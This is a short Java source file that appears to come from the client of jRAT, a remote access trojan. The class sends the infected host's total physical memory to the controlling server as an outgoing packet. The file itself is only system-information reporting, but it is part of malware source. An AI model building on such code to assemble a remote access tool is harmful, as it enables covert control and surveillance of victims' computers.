package jrat.client.packets.outgoing;

import com.sun.management.OperatingSystemMXBean;
import jrat.client.Connection;

import java.lang.management.ManagementFactory;


public class Packet13InitTotalMemory implements OutgoingPacket {

	@Override
	public void write(Connection dos) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
				
		dos.writeLong(total);
	}

	@Override
	public short getPacketId() {
		return (byte) 13;
	}
}
